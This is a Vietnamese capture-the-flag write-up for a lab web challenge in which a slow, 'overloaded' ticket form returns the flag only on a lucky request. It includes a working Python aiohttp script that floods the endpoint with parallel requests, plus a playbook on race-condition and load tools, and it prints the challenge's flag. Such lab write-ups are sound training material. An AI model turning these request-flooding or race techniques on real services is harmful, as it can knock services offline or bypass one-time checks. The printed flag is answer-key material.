# race-condition-ticket

- **Category:** Web (Concurrency / Race)
- **File đề:** Đề online, không có file kèm. Môi trường: website `http://target2:8080/` có form "lấy e-ticket". *(Chú thích: PDF gốc kèm thông tin đăng nhập attack-box và tên nền tảng — lược bỏ theo quy tắc trung tính.)*

## Tóm tắt đề
Trang web có một form và nút "lấy e-ticket", nhưng site "quá tải": theo đề cần "một triệu lần thử trở lên" mới ra flag, trong khi nhiều người chơi khác cũng đang thử cùng lúc. Nhiệm vụ: lấy flag.

## Phân tích (chi tiết: hằng số/offset/payload/khóa thật)
Đây **không** phải lỗ hổng injection, mà là bài **high-concurrency / spray-for-lucky-response**. Cơ chế:
- Form gửi **POST tới `/postform`** (ví dụ `/postform.php`), Content-Type `application/json`.
- Mỗi lần gọi API, server **cố tình chờ ~1 giây** rồi **thường** trả lỗi: *"The site is overloaded. Please try again, Sorry for the inconvenience caused"*.
- Bấm nút quá nhanh trên trình duyệt → lỗi *"Network error: Please try again later or check your network"*.

Vì mỗi request chậm ~1s và chỉ **thỉnh thoảng** mới "trúng" thời điểm server rảnh, gửi tuần tự (serial) sẽ quá chậm (một triệu lần × ~1s là bất khả thi). Khóa thật của bài: phải **gửi song song >10 request/giây** (async / multi-thread / multi-process) và chờ một request "trúng" trả JSON chứa flag:
```json
{"flag":"flag{H4rdToGet0TameshiTick3t}"}
```

## Kỹ thuật áp dụng (+ VÌ SAO nhận ra)
- **Concurrency HTTP** bằng async I/O (`aiohttp`) để vượt độ trễ nhân tạo ~1s/request.
- **VÌ SAO nhận ra:** đề nói rõ API chậm 1s, thường báo "overloaded", và gợi ý trực tiếp "make over 10 requests in a second", "multi-thread, multi-process, or asynchronous". Đây là tín hiệu kinh điển của bài concurrency, không phải lỗ hổng logic cụ thể.
- **Công cụ:** Python + `aiohttp` (hoặc `threading`/`multiprocessing`). Cài: `python3 -m pip install aiohttp`.

## Lời giải chi tiết (bước + code/lệnh/payload sạch, chạy lại được)
1. **Bắt request thật** của form (DevTools/Burp) để biết endpoint, method, headers, body: POST `/postform.php`, JSON.

2. **Viết client async** bắn nhiều request song song, dừng khi response chứa `flag`:
   ```python
   import aiohttp, asyncio, json

   URL = 'http://target2:8080/postform.php'
   FOUND = asyncio.Event()

   async def worker(session):
       formdata = {'key': 'value'}            # thay bằng body thật của form
       headers = {'Content-Type': 'application/json'}
       while not FOUND.is_set():
           try:
               async with session.post(URL, data=json.dumps(formdata),
                                       headers=headers) as resp:
                   text = await resp.text()
                   if 'flag' in text:
                       print(text)
                       FOUND.set()
                       return
           except Exception:
               pass                            # bỏ qua lỗi mạng tạm thời, thử lại

   async def main():
       # tái dùng 1 session để tăng throughput; mở ~20 worker song song
       async with aiohttp.ClientSession() as session:
           await asyncio.gather(*[worker(session) for _ in range(20)])

   asyncio.run(main())
   ```
   (Có thể thay bằng `threading`/`multiprocessing` nếu muốn.)

3. **Chạy script.** Khi một request trúng, server trả JSON chứa flag → in ra và dừng.

## Flag
flag{H4rdToGet0TameshiTick3t}

*(Nguồn canonical `SOLUTIONS_VN.md` — bài #33; flag đã nêu trong writeup đề.)*

## Gặp lại thì xử lý thế nào (playbook)
- **Dấu hiệu nhận diện:** đề nhấn mạnh "overloaded", "rất nhiều lần thử", "nhanh hơn người khác", API cố tình chậm/giới hạn; hoặc logic "chỉ một người lấy được/chỉ 1 suất" (race condition / TOCTOU). Thành công mang tính xác suất theo thời điểm → bài concurrency.
- **Quy trình:** bắt request thật → xác định method/URL/headers/body đúng → viết client async/threaded gửi N request song song trong vòng lặp vô hạn → điều kiện dừng khi thấy `flag`/trạng thái mong muốn.
- **Công cụ:** Python `aiohttp`/`httpx` (async), hoặc `threading`/`multiprocessing`; Burp Intruder/Turbo Intruder (gửi hàng loạt, "last-byte sync" cho race thực sự); `ffuf`/`wrk`/`hey` để tạo tải.
- **Phân biệt race thật:** nếu mục tiêu là "double spend"/vượt kiểm tra một lần, cần gửi các request **đúng cùng thời điểm** (single-packet / last-byte sync của Turbo Intruder), không chỉ số lượng.
- **Bẫy:** sai Content-Type/tham số → luôn 400; mở/đóng ClientSession mỗi request làm chậm (tái dùng session); server rate-limit theo IP → cần nhiều worker nhưng coi chừng tự DoS; đừng bật quá nhiều task gây sập máy mình.
- **Checklist:** [ ] bắt request chuẩn [ ] đúng endpoint/params/headers [ ] viết client song song [ ] vòng lặp + điều kiện dừng theo `flag` [ ] tăng dần concurrency vừa đủ.
